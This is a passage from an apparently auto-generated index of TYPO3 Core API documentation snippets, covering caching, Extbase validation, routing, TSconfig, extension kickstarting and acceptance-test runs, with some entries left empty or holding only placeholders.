TYPO3\\CMS\\Core\\Cache\\CacheTag;\n\n$cacheDataCollector = $request->getAttribute('frontend.cache.collector');\n$cacheDataCollector->removeCacheTags(\n    new CacheTag('tx_myextension_mytable_123'),\n    new CacheTag('tx_myextension_mytable_456'),\n);\n```\n\n----------------------------------------\n\nTITLE: Deleting Demo Data in TYPO3 Styleguide Acceptance Test (PHP)\nDESCRIPTION: PHP method that tests the functionality of deleting demo data in the TYPO3 Styleguide extension. It navigates through the backend interface, accesses the Styleguide module, and triggers the deletion of test records and page tree. The method depends on the prior execution of the 'creatingDemoDataWorks' test.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_13\n\nLANGUAGE: php\nCODE:\n```\n/**\n * @depends creatingDemoDataWorks\n * @param BackendTester $I\n */\npublic function deletingDemoDataWorks(BackendTester $I)\n{\n    $I->click(Topbar::$dropdownToggleSelector, self::$topBarModuleSelector);\n    $I->canSee('Styleguide', self::$topBarModuleSelector);\n    $I->click('Styleguide', self::$topBarModuleSelector);\n    $I->switchToContentFrame();\n    $I->see('TYPO3 CMS Backend Styleguide', 'h1');\n    $I->click('TCA / Records');\n    $I->waitForText('TCA test records');\n    $I->click('Delete styleguide page tree and all styleguide data records');\n    $I->waitForText('The styleguide page tree and all styleguide records were deleted.', 300);\n}\n```\n\n----------------------------------------\n\nTITLE: Including ReStructuredText Image for User Comparison\nDESCRIPTION: This snippet includes a ReStructuredText directive to insert an image showing the user comparison feature in the Backend Users module.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/OverviewOfUsers/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. include:: /Images/AutomaticScreenshots/AccessControl/CompareUsers.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Including ReStructuredText Directive for Backend Users Module\nDESCRIPTION: This snippet includes a ReStructuredText directive for the Backend Users module documentation. It sets up indexing for backend users and modules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/OverviewOfUsers/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index::\n   Backend; Backend users module\n   Module; Backend users\n.. _access-backend-users-module:\n```\n\n----------------------------------------\n\nTITLE: Implementing BlogController class in TYPO3 CMS (PHP)\nDESCRIPTION: This snippet defines the BlogController class, extending AbstractController. It includes a newAction method for displaying a form to create a new blog. The method uses dependency injection for the Blog model and ignores validation for the 'newBlog' parameter.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Annotation/IgnoreValidation.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\nuse TYPO3\\CMS\\Extbase\\Annotation\\IgnoreValidation;\n\nclass BlogController extends AbstractController\n{\n    /**\n     * Displays a form for creating a new blog\n     *\n     * @IgnoreValidation(\"newBlog\")\n     */\n    public function newAction(?Blog $newBlog = null): ResponseInterface\n    {\n        $this->view->assign('newBlog', $newBlog);\n        $this->view->assign(\n            'administrators',\n            $this->administratorRepository->findAll()\n        );\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Local Extension via DDEV\nDESCRIPTION: Command to require and install the newly created extension using DDEV in a Composer-based TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nddev composer req my-vendor/my-test:@dev\n```\n\n----------------------------------------\n\nTITLE: Defining AfterObjectThawedEvent PHP Class in TYPO3 Extbase Persistence\nDESCRIPTION: Documentation for the AfterObjectThawedEvent class which allows modifying values when creating domain objects from database records. The class provides methods to access both the domain object and its underlying record array.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Extbase/AfterObjectThawedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Extbase\\Event\\Persistence\n\n..  php:class:: AfterObjectThawedEvent\n\n    Allows to modify values when creating domain objects.\n\n    ..  php:method:: getObject()\n        :returns: `\\TYPO3\\CMS\\Extbase\\DomainObject\\DomainObjectInterface`\n\n    ..  php:method:: getRecord()\n        :returns: `array`\n```\n\n----------------------------------------\n\nTITLE: Avoiding Broad Exception Catching in PHP\nDESCRIPTION: Examples of poor exception handling practices in PHP, including catching RuntimeException and Exception, which can hide serious underlying issues.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/WorkingWithExceptions.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n\\RuntimeException\n```\n\nLANGUAGE: PHP\nCODE:\n```\n\\Exception\n```\n\n----------------------------------------\n\nTITLE: Configuring Workspace Access for TYPO3 Backend Modules\nDESCRIPTION: Shows how to restrict access to backend modules based on workspace settings in the module configuration. This example sets the module to be available only in the live workspace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\nreturn [\n    'web_examples' => [\n        'parent' => 'web',\n        // Only available in live workspace\n        'workspaces' => 'live',\n        // ... other configuration\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Handling Execution Time in TYPO3 with EXEC_TIME\nDESCRIPTION: EXEC_TIME sets a common script execution time using `time()`. While traditionally used for consistent timing, it is recommended to switch to the DateTime Aspect for future implementations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/GlobalVariables.rst#2025-04-16_snippet_7\n\n\n\n----------------------------------------\n\nTITLE: Creating New Record on New Page in TYPO3 Workspace\nDESCRIPTION: CSV table showing the database representation of creating a new record on a page that is also new in the TYPO3 workspace. It demonstrates the relationship between the new record and its new parent page.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: csv\nCODE:\n```\nuid,pid,deleted,sorting,t3ver_wsid,t3ver_oid,t3ver_state,l10n_parent,sys_language_uid,title\n...,...,...,...,...,...,...,...,...,...,...\n29,41,0,128,1,0,1,0,0,Topic #1 Article new\n30,-1,0,128,1,29,-1,0,0,Topic #1 Article new\n```\n\n----------------------------------------\n\nTITLE: Implementing getPage Method in ModifyUrlForCanonicalTagEvent Class\nDESCRIPTION: This method retrieves the current page object. It returns an instance of the TYPO3\\CMS\\Core\\Domain\\Page class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Seo/ModifyUrlForCanonicalTagEvent.rst.txt#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: getPage()\n        :returns: `\\TYPO3\\CMS\\Core\\Domain\\Page`\n```\n\n----------------------------------------\n\nTITLE: Defining Deprecated Static Method Example in PHP\nDESCRIPTION: Example showing how a deprecated static method is defined in TYPO3 Core with a deprecation annotation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/UpdateExtensions/ExtensionScanner.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Utility;\n\nclass SomeUtility\n{\n    /**\n     * @deprecated since ...\n     */\n    public static function someMethod($foo = '') {\n        // do something deprecated\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Registry Values in TYPO3\nDESCRIPTION: Shows how to retrieve previously stored values from the TYPO3 registry\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SystemRegistry/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Registry;\n\nclass MyClass\n{\n    private Registry $registry;\n\n    public function __construct(Registry $registry)\n    {\n        $this->registry = $registry;\n    }\n\n    public function checkLastRun(): int\n    {\n        return $this->registry->get('tx_myextension', 'lastRun', 0);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating TYPO3 Symlinks on Linux\nDESCRIPTION: Commands to create the required symlinks in the public directory pointing to TYPO3 source files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/LegacyInstallation.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncd public\nln -s ../typo3_src-13.4.y typo3_src\nln -s typo3_src/index.php index.php\nln -s typo3_src/typo3 typo3\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 User Settings Array\nDESCRIPTION: The TYPO3_USER_SETTINGS array configures the User Settings form, defined in setup/ext_tables.php. It allows customization of user-specific settings within the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/GlobalVariables.rst#2025-04-16_snippet_4\n\n\n\n----------------------------------------\n\nTITLE: Incorrect Function Return Path\nDESCRIPTION: Example of an invalid function that does not guarantee a return value for all code paths\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_26\n\nLANGUAGE: php\nCODE:\n```\nfunction extendedUse(bool $enabled): string\n{\n    if ($enabled) {\n        return 'Extended use';\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Session Storage in TYPO3\nDESCRIPTION: Example configuration for implementing a custom session storage backend using a vendor-specific implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/Sessions/SessionStorage.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n'SYS' => [\n    'session' => [\n        'FE' => [\n            'backend' => \\Vendor\\Sessions\\MyCustomSessionBackend::class,\n            'options' => [\n                'foo' => 'bar',\n            ]\n        ],\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: Incorrect Curly Braces Placement Example in PHP\nDESCRIPTION: Presents a non-compliant example of curly brace placement in PHP code, against the guidelines provided.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_11\n\nLANGUAGE: php\nCODE:\n```\nprotected function getForm() {\n    if ($this->extendedForm) { // generate extended form here\n    } else {\n        // generate simple form here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Hiding Site Sets via User TSconfig\nDESCRIPTION: This TypoScript configuration shows how to hide specific site sets from the backend user interface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\noptions.sites.hideSets := addToList(typo3/fluid-styled-content)\n```\n\n----------------------------------------\n\nTITLE: User TSconfig File Configuration\nDESCRIPTION: Convention for defining user TSconfig files in TYPO3 extensions with .tsconfig file extension, located in Configuration/TsConfig/User directory\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/TsConfig/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n..  typo3:file:: something.tsconfig\n    :scope: extension\n    :path: /Configuration/TsConfig/User\n    :regex: /^.*Configuration\\/TsConfig\\/User\\/.*\\.tsconfig$/\n    :shortDescription: Contains user TSconfig files. The path is convention, the files must end on .tsconfig.\n```\n\n----------------------------------------\n\nTITLE: Bash Aliases for Project Test and Documentation Tasks\nDESCRIPTION: Create reusable shell aliases for common project tasks like running tests, rendering documentation, and build processes. Useful for local development environments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/TestRunners.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nalias test-project=\"php vendor/bin/phpunit -c Build/phpunit/UnitTests.xml\"\nalias render-docs=\"docker run --rm --pull always -v ./:/project/ ghcr.io/typo3-documentation/render-guides:latest --no-progress --config=Documentation Documentation\"\nalias render-sync=\"open http://localhost:5174/Documentation-GENERATED-temp/Index.html && docker run --rm -it --pull always -v ./Documentation:/project/Documentation -v ./Documentation-GENERATED-temp:/project/Documentation-GENERATED-temp -p 5174:5173 ghcr.io/garvinhicking/typo3-documentation-browsersync:latest\"\nalias render-changelog=\"docker run --rm --pull always -v ./:/project/ ghcr.io/typo3-documentation/render-guides:latest --no-progress --config=typo3/sysext/core/Documentation typo3/sysext/core/Documentation\"\nalias t3-build=\"Build/Scripts/runTests.sh -s composerInstall ; Build/Scripts/runTests.sh -s clean ; Build/Scripts/runTests.sh -s buildCss ; Build/Scripts/runTests.sh -s buildJavascript\"\n```\n\n----------------------------------------\n\nTITLE: Loading Environment-Specific PHP Configuration in TYPO3\nDESCRIPTION: This PHP code snippet demonstrates how to load an environment-specific PHP configuration file in a TYPO3 project. It checks for the existence of the environment.php file and includes it if present.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/EnvironmentConfiguration.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n<?php\n$environmentFile = __DIR__ . '/environment.php';\nif (file_exists($environmentFile)) {\n    require $environmentFile;\n}\n\n// ... Your other custom configuration\n```\n\n----------------------------------------\n\nTITLE: Kickstarting a TYPO3 Extension in Composer setup\nDESCRIPTION: Command to start the extension creation wizard in a Composer-based TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 make:extension\n```\n\n----------------------------------------\n\nTITLE: Boolean Field Validation with Extbase\nDESCRIPTION: The BooleanValidator checks if a value is a boolean or matches a certain boolean value. This is customizable using the 'is' option for strict checks. It supports automatic conversion and validation of boolean-equivalent strings and integers. This snippet demonstrates validations without strict checks and ensuring a boolean must be true or false.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n#[Validate(['validator' => 'Boolean'])]\nprotected $isActive;\n```\n\nLANGUAGE: PHP\nCODE:\n```\n#[Validate(['validator' => 'Boolean', 'options' => ['is' => true]])]\nprotected bool $termsAccepted;\n```\n\nLANGUAGE: PHP\nCODE:\n```\n#[Validate(['validator' => 'Boolean', 'options' => ['is' => false]])]\nprotected bool $isBlocked;\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Global Configuration Variables\nDESCRIPTION: Examples of TYPO3 configuration variables used for error and exception handling settings in the system configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Configuration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['debug']\n$GLOBALS['TYPO3_CONF_VARS']['FE']['debug']\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['devIPmask']\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['displayErrors']\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['errorHandler']\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['errorHandlerErrors']\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['exceptionalErrors']\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['productionExceptionHandler']\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['debugExceptionHandler']\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['belogErrorReporting']\n```\n\n----------------------------------------\n\nTITLE: Defining LoginErrorOccurredEvent in TYPO3 Frontend Login\nDESCRIPTION: Defines the LoginErrorOccurredEvent class that serves as a notification when login errors occur. The class is part of the TYPO3\\CMS\\FrontendLogin\\Event namespace and includes a getRequest() method that returns a ServerRequestInterface object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/FrontendLogin/LoginErrorOccurredEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\FrontendLogin\\Event;\n\nclass LoginErrorOccurredEvent\n{\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring FlexForm Reload on Change in XML\nDESCRIPTION: Demonstrates how to trigger a reload of the FlexForm when specific settings are changed using the <onChange> element in XML configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: xml\nCODE:\n```\n<onChange>reload</onChange>\n<config>\n    <!-- ... -->\n</config>\n```\n\n----------------------------------------\n\nTITLE: Registering Custom OpenGraph MetaTagManager with Priority in TYPO3\nDESCRIPTION: Shows how to register a custom OpenGraph MetaTagManager with higher priority in the ext_localconf.php file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/MetaTagApi.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n    \\TYPO3\\CMS\\Core\\MetaTag\\MetaTagManagerRegistry::class\n)->registerManager(\n    'opengraph',\n    \\MyVendor\\MyExtension\\MetaTag\\MyOpenGraphMetaTagManager::class,\n    ['before' => \\TYPO3\\CMS\\Core\\MetaTag\\OpenGraphMetaTagManager::class]\n);\n```\n\n----------------------------------------\n\nTITLE: RST Include and Index Directives\nDESCRIPTION: RST directives for including a common file and setting up index entries for RequireJS dependency handling documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/RequireJS/Dependency/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: RequireJS; Dependency handling\n..  _requirejs-dependency:\n```\n\n----------------------------------------\n\nTITLE: CSP Reporting URL Configuration Example\nDESCRIPTION: Example configuration for setting a custom Content Security Policy reporting URL in TYPO3 frontend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/FE.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['FE']['contentSecurityPolicyReportingUrl']\n    = 'https://csp-violation.example.org/';\n```\n\n----------------------------------------\n\nTITLE: YAML Aspect Precedence Configuration Example\nDESCRIPTION: Demonstrates how aspects take precedence over requirements in route path definitions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/AdvancedRoutingConfiguration.rst#2025-04-16_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\n_AspectPrecedence.yaml\n```\n\n----------------------------------------\n\nTITLE: Including RST file in TYPO3 Documentation\nDESCRIPTION: This RST directive includes a common file named 'Includes.rst.txt' in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n```\n\n----------------------------------------\n\nTITLE: PHP Custom Route Enhancer Implementation\nDESCRIPTION: Custom route enhancer class implementing unresolved value handling for custom routing scenarios.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/AdvancedRoutingConfiguration.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n// EXT:my_extension/Classes/Routing/Enhancer/MyCustomEnhancer.php\n```\n\n----------------------------------------\n\nTITLE: Running TYPO3 Styleguide Acceptance Tests (Shell)\nDESCRIPTION: Shell script example showing how to execute the acceptance tests for the TYPO3 Styleguide extension using the runTests.sh script. It demonstrates the Docker container setup with Chrome, web server, and MariaDB for test execution, and shows the test output including test results and teardown process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_14\n\nLANGUAGE: shell\nCODE:\n```\nlolli@apoc /var/www/local/git/styleguide $ Build/Scripts/runTests.sh -s acceptance\nCreating network \"local_default\" with the default driver\nCreating local_chrome_1    ... done\nCreating local_web_1       ... done\nCreating local_mariadb10_1 ... done\nWaiting for database start...\nDatabase is up\nCodeception PHP Testing Framework ...\nPowered by PHPUnit ... by Sebastian Bergmann and contributors.\nRunning with seed:\n\n\n  Generating BackendTesterActions...\n\nTYPO3\\CMS\\Styleguide\\Tests\\Acceptance\\Support.Backend Tests (3) -------------------------------------------------------\nModules: WebDriver, \\TYPO3\\TestingFramework\\Core\\Acceptance\\Helper\\Acceptance, \\TYPO3\\TestingFramework\\Core\\Acceptance\\Helper\\Login, Asserts\n-----------------------------------------------------------------------------------------------------------------------\n⏺ Recording ⏺ step-by-step screenshots will be saved to /var/www/local/git/styleguide/Tests/../.Build/Web/typo3temp/var/tests/AcceptanceReports/\nDirectory Format: record_5be078fb43f86_{filename}_{testname} ----\n\n  Database Connection: {\"Connections\":{\"Default\":{\"driver\":\"mysqli\",\"dbname\":\"func_test_at\",\"host\":\"mariadb10\",\"user\":\"root\",\"password\":\"funcp\"}}}\n  Loaded Extensions: [\"core\",\"extbase\",\"fluid\",\"backend\",\"about\",\"install\",\"frontend\",\"typo3conf/ext/styleguide\"]\nModuleCest: Styleguide in topbar help can be called\n\n...\n\nTime: 27.89 seconds, Memory: 28.00MB\n\nOK (3 tests, 6 assertions)\nStopping local_mariadb10_1 ... done\nStopping local_chrome_1    ... done\nStopping local_web_1       ... done\nRemoving local_acceptance_backend_mariadb10_run_1 ... done\nRemoving local_mariadb10_1                        ... done\nRemoving local_chrome_1                           ... done\nRemoving local_web_1                              ... done\nRemoving network local_default\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 Debug Exception Handler\nDESCRIPTION: The debug exception handler class used for displaying error messages as flash messages in the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/ErrorHandler/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Error\\DebugExceptionHandler\n```\n\n----------------------------------------\n\nTITLE: Installing Make Extension via Composer\nDESCRIPTION: Command to install the Make extension as a dev dependency in a Composer-based TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncomposer req b13/make --dev\n```\n\n----------------------------------------\n\nTITLE: TypoScript Setup Configuration\nDESCRIPTION: Optional file containing TypoScript setup configuration for the site when using site as a TypoScript provider.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/DirectoryStructure/SiteFolder.rst#2025-04-16_snippet_4\n\nLANGUAGE: typoscript\nCODE:\n```\nsetup.typoscript\n```\n\n----------------------------------------\n\nTITLE: Simple Parameter Exclusion Configuration for cHash\nDESCRIPTION: Example showing the traditional way to exclude multiple parameters from cHash calculation by listing them individually. This approach works but can be verbose when multiple similar parameters need to be excluded.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'excludedParameters' => [\n    'tx_my_plugin[data][uid]',\n    'tx_my_plugin[data][category]',\n    'tx_my_plugin[data][order]',\n    'tx_my_plugin[data][origin]',\n    // ...\n],\n```\n\n----------------------------------------\n\nTITLE: Using Expression Builder CONCAT in PHP\nDESCRIPTION: Demonstrates how to use ExpressionBuilder::concat() to concatenate values, row field values or expression results into a single string value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: PHP\nCODE:\n```\n// Code snippet not provided in the text\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 Global Configuration Variable\nDESCRIPTION: Shows the syntax for referencing the main TYPO3 configuration array in PHP. This global array contains all core and extension configuration values.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/BackendModules/GlobalValuesConfiguration.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']\n```\n\n----------------------------------------\n\nTITLE: Defining PageContentPreviewRenderingEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the PageContentPreviewRenderingEvent class in the TYPO3\\CMS\\Backend\\View\\Event namespace. It includes methods for retrieving and setting various properties related to content preview rendering in the TYPO3 CMS Page Module.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/PageContentPreviewRenderingEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Backend\\View\\Event\n\n..  php:class:: PageContentPreviewRenderingEvent\n\n    Use this Event to have a custom preview for a content type in the Page Module\n\n    ..  php:method:: getTable()\n        :returns: `string`\n\n    ..  php:method:: getRecordType()\n        :returns: `string`\n\n    ..  php:method:: getRecord()\n        :returns: `array`\n\n    ..  php:method:: setRecord(array $record)\n\n        :param $record: the record\n\n    ..  php:method:: getPageLayoutContext()\n        :returns: `\\TYPO3\\CMS\\Backend\\View\\PageLayoutContext`\n\n    ..  php:method:: getPreviewContent()\n        :returns: `?string`\n\n    ..  php:method:: setPreviewContent(string $content)\n\n        :param $content: the content\n\n    ..  php:method:: isPropagationStopped()\n        :returns: `bool`\n```\n\n----------------------------------------\n\nTITLE: TypoScript Copy Operator Example\nDESCRIPTION: This TypoScript snippet illustrates the behavior of the copy operator (`<`). It demonstrates that copying an identifier creates a separate instance, and subsequent changes to the original identifier do not affect the copied one, and vice versa.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorCopy4.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n.. code-block:: typoscript\n   :caption: Extension examples, file Configuration/TypoScript/Syntax/OperatorCopy4/setup.typoscript\n\n   # The above is identical to this:\n   myIdentifier = TEXT\n   myIdentifier.value = Hello world\n   myOtherIdentifier < myIdentifier\n\n   # Changing myIdentifier *after* it has been copied over to myOtherIdentifier,\n   # does *not* change myOtherIdentifier. The below line only changes the\n   # value of myIdentifier, not myOtherIdentifier:\n   myIdentifier.value = Hello world 2\n\n   # Changing myOtherIdentifier *after* it has been copied from to myIdentifier,\n   # does *not* change myIdentifier. The below line only changes the\n   # value of myOtherIdentifier, not myIdentifier:\n   myOtherIdentifier.value = Hello world 3\n```\n\n----------------------------------------\n\nTITLE: Creating Content with Category References in PHP\nDESCRIPTION: Example of creating new content records with references to existing and new system categories.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n$data['sys_category']['NEW9823be87'] = [\n    'title' => 'New category',\n    'pid' => 1,\n];\n$data['tt_content']['NEWbe68s587'] = [\n    'header' => 'Look ma, categories!',\n    'pid' => 45,\n    'categories' => [\n        1,\n        2,\n        'NEW9823be87', // You can also use placeholders here\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Declaring GeneratePublicUrlForResourceEvent Class Methods\nDESCRIPTION: Definition of methods available in the GeneratePublicUrlForResourceEvent class for TYPO3 FAL resource handling. These methods allow access to resource information and URL manipulation.\nSOURCE: 